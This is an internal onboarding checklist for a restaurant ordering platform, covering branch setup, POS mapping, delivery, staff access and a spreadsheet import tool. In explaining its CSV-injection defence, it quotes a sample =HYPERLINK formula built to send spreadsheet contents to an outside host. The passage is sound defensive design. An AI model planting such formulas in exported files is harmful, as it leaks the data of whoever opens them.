# Restaurant Branch Onboarding Checklist

> **Updated 2026-08-12.** Everything that must be true before a new restaurant branch takes its first approved test/real order.

This document is about a Spicy Meal **restaurant branch**, not a Git branch.

## 1. Create/configure the branch — Admin → Branches

Set and verify the current branch fields in the admin UI/source schema, including:

- Arabic/English name and address;
- operational phone/contact;
- latitude/longitude;
- pickup/delivery enablement;
- delivery fee/minimum/estimate where delivery is supported;
- active/temporary-closure state.

Do not activate a branch simply because the row exists. Complete POS/menu/delivery verification first.

## 2. Menu availability

Branch availability is server-authoritative. Historically, absence of an explicit availability override means the catalog defaults to available, so a new branch can unintentionally expose products it does not stock.

Before activation:

- [ ] review the current product list with the branch manager;
- [ ] mark unavailable items deliberately;
- [ ] verify required modifier groups are usable for the branch/catalog combination;
- [ ] re-check availability after major menu additions/changes.

## 3. Lazywait POS mapping — critical

- [ ] `lazywait_branch_id` is the branch's real Lazywait identifier.
- [ ] Mapping is confirmed from the POS/Lazywait side, not guessed from a similar branch name.
- [ ] Lazywait catalog/mapping state is healthy.
- [ ] An approved pickup test order reaches the expected POS branch/ticket path before launch.

Without a valid mapping, the system cannot safely complete normal POS synchronization. Current production hardening surfaces unexpected blocked/dead-letter states through Order Integrity / Operations Health, and the customer confirmation lifecycle should not claim restaurant confirmation without a usable POS reference—but the kitchen still will not receive a valid POS ticket.

Do not activate a branch while relying on monitoring to catch a known bad mapping.

## 4. Pickup and delivery

Set each order type deliberately.

### Pickup

- [ ] pickup is enabled only when the branch can receive/prepare pickup orders;
- [ ] branch location is correct for nearest-branch sorting;
- [ ] menu availability is accurate;
- [ ] POS mapping/test succeeds.

### Delivery

- [ ] delivery is enabled only when the current product/process supports it;
- [ ] delivery zone exists and matches the real service area;
- [ ] delivery fee/minimum/estimate are correct;
- [ ] required address guidance/landmark behavior is understood by staff;
- [ ] branch has an agreed operational handling/dispatch process.

**Updated 2026-08-27.** The Lazywait integration *used* to treat `delivery_schema_unconfirmed` as a safety block rather than invent an unvalidated provider payload. That block is gone: the delivery payload has been validated against the live POS, and delivery orders now create real tickets. `delivery_schema_unconfirmed` survives only on four historical orders and can no longer be produced. The operational requirement is unchanged and now matters more, not less: do not enable a customer-facing delivery operation unless the branch has a verified current process for handling the resulting orders, because those orders now reach the kitchen.

## 5. Operating hours / open-close process

The repository has historically not had a full automatic branch-hours model. Verify the current schema/admin behavior before onboarding and document who owns daily open/close/temporary-delivery-closure operations.

- [ ] named person/role owns opening state;
- [ ] named person/role owns closing state;
- [ ] temporary closure procedure is understood;
- [ ] in-flight orders are checked before closing/deactivating.

Do not assume `is_active` is a harmless setup flag; it directly affects customer eligibility/order routing.

## 6. Approved pre-launch test

Do not use an online payment/refund test while the payment area is frozen unless separately approved.

For an approved cash/non-payment pickup test:

- [ ] customer can select the branch through the order-type gate;
- [ ] correct branch catalog is shown;
- [ ] order appears in Admin → Live Orders;
- [ ] Lazywait/POS lifecycle reaches the expected confirmed/synced state;
- [ ] usable external POS/order reference is shown where expected;
- [ ] physical/operational branch confirms the ticket/order was actually received;
- [ ] order status can be advanced through the supported lifecycle;
- [ ] Operations Health / Order Integrity shows no unexpected stranded state;
- [ ] Orders Requiring Verification does not contain the test order unless the scenario intentionally tests that state.

If delivery is being launched, perform a separate approved delivery process validation covering zone/address handling and the branch's real operational handoff.

## 7. Staff and access readiness

- [ ] intended staff can reach the admin console through the supported role/MFA flow;
- [ ] the branch has its own `branch_staff` account, created from Admin → Integrations → Staff Access → Accounts and pinned to this branch;
- [ ] that account signs in with email and password only — branch and call-centre roles are deliberately outside the TOTP requirement (see `ARCHITECTURE.md` §3), so it must not be shared beyond the people working the counter;
- [ ] no one is sharing a personal/admin credential as branch onboarding;
- [ ] staff know the Live Orders / receipt/ticket / POS verification workflow;
- [ ] staff have read `STAFF_MANUAL.md`;
- [ ] branch knows the incident/escalation contact, not merely “ask IT.”

## 7b. Trading hours and delivery areas — Admin → Branches → Data import

Two branch-level features are fully built, tested and RLS'd, and were **entirely
empty in Production** as of 2026-09-13: across 40 branch rows there were **zero
working-hours rows and zero delivery areas**. Every screen that answers "when is
this branch open" or "where does it deliver" therefore rendered a dash, for every
branch. Filling that in through the per-branch editors is forty visits.

**Admin → Branches → Data import** takes both as a paste from a spreadsheet. It
adds no server surface: every write goes through the same two admin RPCs the
per-branch editors already use — `admin_upsert_branch_working_hours` and
`admin_add_delivery_area` — so an administrator can do nothing there that they
could not already do one form at a time, and an accountant cannot use it at all.

### What the format is

Working hours are **wide**: one row per branch, one column per weekday, with a
**required header** naming the days. The header is required on purpose — a
positional format silently writes Tuesday's hours onto Monday the first time
somebody reorders the columns. A cell is either a window (`11:00-02:00`) or a
closed marker (`closed`, `off`, `-`, `x`, `مغلق`, or simply empty).

**A window whose close is at or before its open is valid** and means it crosses
midnight. That is the normal case here, not the exception:
`admin_upsert_branch_working_hours` says so explicitly, and rejecting it would
have made the import useless for most branches.

Delivery areas are one row per area: `branch`, `name_ar` (required) and an
optional `name_en`.

Both boxes offer a **downloadable template listing every branch**, pre-filled as
closed — an invented `09:00-22:00` would look like data.

### What it refuses to guess

The branch column accepts an id, an English name or an Arabic name. **An
ambiguous name is an error, not a coin flip.** The live table holds visible
duplicates (the same branch with and without a `lazywait_branch_id`), so picking
the first match would write trading hours onto whichever row happened to sort
first and nothing downstream would notice. For the same reason a template emits
the **id** rather than the name for any branch whose name is not unique, plus a
trailing `note` column so a human can still tell two identically named branches
apart.

A branch listed twice in one paste is refused as well, naming the earlier line:
otherwise whichever row came last would win, silently.

### The template cannot carry a formula out of the database

The downloaded `.tsv` is opened in Excel or Google Sheets, and both read a cell
that begins `=`, `+`, `-` or `@` as a **formula** rather than as text. Branch
names are administrator- and POS-supplied, so a branch named
`=HYPERLINK("http://…"&A1,"open")` would run in the administrator's own
spreadsheet the moment the file opened — sending the rest of the sheet to a third
party, with no prompt a reader would recognise as a warning. That is the
CSV-injection class, and it is closed at the point the file is written.

The two columns are protected differently, because only one of them is read back:

- **`branch`** carries the **id** whenever the name would be unsafe, exactly as
  it already does for a name that is not unique. Escaping it instead would make
  the row resolve to no branch at all, so the sheet would stop importing — the id
  is a `uuid`, which by its own type can neither begin with a formula character
  nor contain a tab.
- **`note`** is decorative; no parser reads it. It is escaped in place: a leading
  formula character gets the apostrophe both spreadsheets treat as "this cell is
  text".

Tabs, carriage returns and newlines are handled in the same pass, for a different
reason: a tab inside a name would invent a column and a newline would invent a
row, so one branch name could re-shape every row below it — and the invented row
would be parsed on import as a real one.

### What it does not do

- **Nothing is written on paste.** Pasting parses; a separate button applies. The
  preview between the two names the branches that will be touched and the rows
  that were refused.
- **An area the branch already has is skipped, not inserted again.**
  `admin_add_delivery_area` always INSERTs, so re-running the same sheet without
  that check would double every area. Duplicates *within* one paste count too.
  The existing list is re-read at each check rather than at mount, because the
  administrator may have added an area in the editor since the screen opened.
- **It never deletes.** The import fills a gap; it does not reconcile a list. An
  area an operator has disabled is not something a paste box should remove.
- Applying is **sequential**, so a partial failure reports exactly how far it got
  and which branches refused — forty concurrent RPCs would be unkind to the
  database and muddle the reporting.

Rules and their tests: `src/lib/branchImport.ts` and `src/lib/branchImport.test.ts`.

## 8. Go-live check

Before setting the branch live:

- [ ] branch data/location correct;
- [ ] product availability reviewed;
- [ ] POS mapping verified;
- [ ] enabled order types operationally supported;
- [ ] delivery zone/process verified if enabled;
- [ ] staff access/MFA works;
- [ ] approved test completed;
- [ ] no unexpected critical Operations Health / Order Integrity issue;
- [ ] owner/operations approves activation.

## 9. Deactivation / temporary closure

Before deactivating a branch:

- check in-flight orders;
- confirm whether pickup, delivery or the entire branch needs to stop;
- use the supported branch controls;
- record who changed the state and expected restore time;
- communicate with the branch/affected customers when required.

Deactivation does not automatically resolve already-placed orders.

## Related docs

- `STAFF_MANUAL.md`
- `INCIDENT_RESPONSE.md`
- `ORDER_CONFIRMATION_FLOW.md`
- `ARCHITECTURE.md`
- `PAYMENT_POSTPONEMENT.md`